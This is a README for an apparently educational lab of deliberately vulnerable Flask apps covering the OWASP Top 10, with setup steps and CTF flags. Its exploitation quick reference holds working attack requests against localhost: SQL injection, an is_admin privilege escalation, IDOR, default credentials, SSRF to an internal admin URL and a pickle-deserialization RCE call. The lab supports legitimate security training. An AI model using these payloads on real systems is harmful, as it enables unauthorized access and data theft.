# OWASP Top 10 Vulnerable Applications Lab

![OWASP](https://owasp.org/www-project-top-ten/)

## 📚 Description

Comprehensive educational lab for learning the **OWASP Top 10** vulnerabilities through **practical exploitation**. Each lab is a deliberately vulnerable Flask application with flags hidden in exploitable vulnerabilities.

🎯 **Goal**: Learn real-world exploitation techniques in a safe, containerized environment.

## 🛡️ OWASP Top 10 Coverage

| # | Vulnerability | Port | Flags | Status |
|---|---|---|---|---|
| **A1** | Broken Access Control | 5001 | `FLAG{broken_access_control}` | ✅ |
| **A2** | Cryptographic Failures | 5002 | `FLAG{crypto_failure}` | ✅ |
| **A3** | Injection | 5003 | `FLAG{sql_injection}`, `FLAG{command_injection}` | ✅ |
| **A4** | Insecure Design | 5004 | `FLAG{insecure_design}`, `FLAG{business_logic_flaw}` | ✅ |
| **A5** | Security Misconfiguration | 5005 | `FLAG{misconfigured}`, `FLAG{debug_enabled}` | ✅ |
| **A6** | Vulnerable & Outdated Components | 5006 | `FLAG{yaml_rce}`, `FLAG{vulnerable_components}` | ✅ |
| **A7** | Authentication & Session Flaws | 5007 | `FLAG{weak_session}`, `FLAG{jwt_no_expiration}` | ✅ |
| **A8** | Software & Data Integrity Failures | 5008 | `FLAG{pickle_rce}`, `FLAG{no_integrity}` | ✅ |
| **A9** | Security Logging & Monitoring Failures | 5009 | `FLAG{no_failed_login_log}`, `FLAG{logs_exposed}` | ✅ |
| **A10** | Server-Side Request Forgery (SSRF) | 5010 | `FLAG{ssrf_basic}`, `FLAG{ssrf_localhost}` | ✅ |

## 🚀 Quick Start

### Prerequisites
- Docker & Docker Compose installed
- Curl or Postman for API testing
- Basic understanding of web security

### Installation & Setup

```bash
# 1. Clone the repository
git clone https://github.com/Pucci-07/Top10-owasp-lab.git
cd Top10-owasp-lab

# 2. Start all vulnerable applications
docker-compose up -d

# 3. Verify all services are running
docker-compose ps

# 4. Access the labs
# Open your browser or use curl to access:
# http://localhost:5001 - http://localhost:5010
```

### Stopping the labs

```bash
docker-compose down
```

## 🎯 Exploitation Quick Reference

### A1 - Broken Access Control (IDOR)
```bash
curl http://localhost:5001/api/user/2
# Returns: FLAG{broken_access_control}
```

### A2 - Cryptographic Failures
```bash
curl http://localhost:5002/config.json
# Returns: All secrets and encryption keys
```

### A3 - SQL Injection
```bash
curl "http://localhost:5003/api/search?username=admin' OR '1'='1"
# Returns: All users and FLAG{sql_injection}
```

### A4 - Insecure Design (Privilege Escalation)
```bash
curl -X POST http://localhost:5004/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"test","is_admin":true}'
# Returns: FLAG{insecure_design}
```

### A5 - Security Misconfiguration
```bash
curl http://localhost:5005/debug
# Returns: All configuration, keys, and FLAG{debug_enabled}
```

### A6 - Vulnerable Components
```bash
curl http://localhost:5006/dependencies
# Shows vulnerable packages: PyYAML 5.3.1, Pillow 8.0.0
```

### A7 - Authentication Flaws
```bash
curl -X POST http://localhost:5007/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
# Returns: FLAG{weak_session}
```

### A8 - Integrity Failures
```bash
curl -X POST http://localhost:5008/api/deserialize \
  -H "Content-Type: application/json" \
  -d '{"data":"base64_pickle_payload"}'
# RCE via pickle deserialization
```

### A9 - Logging Failures
```bash
curl http://localhost:5009/logs
# Shows exposed sensitive data in logs
```

### A10 - SSRF
```bash
curl -X POST http://localhost:5010/api/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8080/admin"}'
# Access internal services
```

## 📖 Lab Structure

Each lab contains:

```
aX_vulnerability_name/
├── app.py              # Vulnerable Flask application
├── Dockerfile          # Container configuration
├── requirements.txt    # Python dependencies
└── README.md          # Detailed exploitation guide
```

### Example Lab README Contents:
- 📝 **Description** - What is the vulnerability?
- 🔓 **Vulnerable Code** - Show the vulnerable patterns
- 🚀 **Exploitation Steps** - How to exploit it
- 📋 **CTF Flags** - Flags to retrieve
- ✅ **Remediation** - How to fix it
- 📚 **Concepts** - Key security concepts

## 🛠️ Tools Needed

- `curl` - Command-line HTTP client
- `sqlmap` - SQL injection tool (for A3)
- `Burp Suite` - Web proxy (optional)
- `Python 3.9+` - For local testing

## 📚 Learning Path

### Beginner
1. Start with **A1** (Broken Access Control) - Easy IDOR
2. Move to **A2** (Cryptographic Failures) - Understanding encoding vs encryption
3. Try **A5** (Misconfiguration) - Finding exposed configs

### Intermediate
4. **A3** (Injection) - SQL injection techniques
5. **A4** (Insecure Design) - Business logic flaws
6. **A7** (Authentication) - Session management

### Advanced
7. **A6** (Vulnerable Components) - Dependency vulnerabilities
8. **A8** (Integrity Failures) - Deserialization attacks
9. **A9** (Logging) - Finding security events
10. **A10** (SSRF) - Server-side request forgery

## 🔧 Common Issues

### Port Already in Use
```bash
# Change port in docker-compose.yml
ports:
  - "5001:5001"  # Change 5001 to another port
```

### Docker Build Error
```bash
docker-compose build --no-cache
```

### Permission Denied
```bash
chmod +x setup.sh
./setup.sh
```

## 🎓 Educational Value

### Skills Developed
- ✅ Identifying vulnerability patterns
- ✅ Exploitation technique development
- ✅ Understanding security controls
- ✅ Web application testing methodology
- ✅ CTF/Bug bounty techniques

### Real-World Applicability
These labs mirror actual vulnerabilities found in:
- Bug bounty programs (HackerOne, Bugcrowd)
- OWASP Top 10 assessments
- Web application penetration testing
- Security training certifications

## 📖 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Top 10 for 2021](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [HackerOne Vulnerability Reports](https://hackerone.com/)

## ⚖️ Legal & Ethical Notice

⚠️ **DISCLAIMER**: These applications are intentionally vulnerable for **educational purposes only**. 

- **Only use in a local environment or authorized testing**
- **Never deploy to production**
- **Unauthorized access to systems is illegal**
- **Use responsibly and ethically**

## 🤝 Contributing

Found a bug or want to improve a lab? Feel free to:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## 📞 Support

For questions or issues:
- Check the individual lab's README.md
- Review the /debug endpoint for hints
- Compare your approach with the exploitation guide

## 📜 License

This project is for educational purposes. Use responsibly.

---

**Ready to hack? Start with A1! 🚀**

```bash
docker-compose up -d
curl http://localhost:5001
```

**Happy hacking! 🛡️**
